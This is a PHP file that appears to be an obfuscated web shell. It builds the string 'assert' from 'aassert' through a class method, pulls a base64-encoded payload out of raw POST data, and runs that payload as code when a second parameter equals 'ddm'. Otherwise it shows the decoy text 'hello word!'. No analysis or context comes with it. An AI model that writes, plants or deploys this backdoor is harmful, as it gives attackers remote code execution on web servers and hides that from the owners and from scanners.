<?php 
header("Content-Type:text/html;charset=gb2312");
$a = $GLOBALS['HTTP_RAW_POST_DATA'];

if (strpos((string)$a,"&") !== false) {
	$p = explode("&", $a);
	$pay = explode("=CdpaVNvb", $p[0]);
}else{
	$pay = explode("=CdpaVNvb", $a);
}
$mm = explode("=", $p[1]);
class ddm{
	public $a = "aassert";
	function qvm(){
		return substr($this->a,1);
	}
}
$b=new ddm();
$c = $b->qvm();
if ($mm[1] == "ddm"){
	[$c(base64_decode($pay[1]))];
}else{
	echo "hello word!";
}

 ?>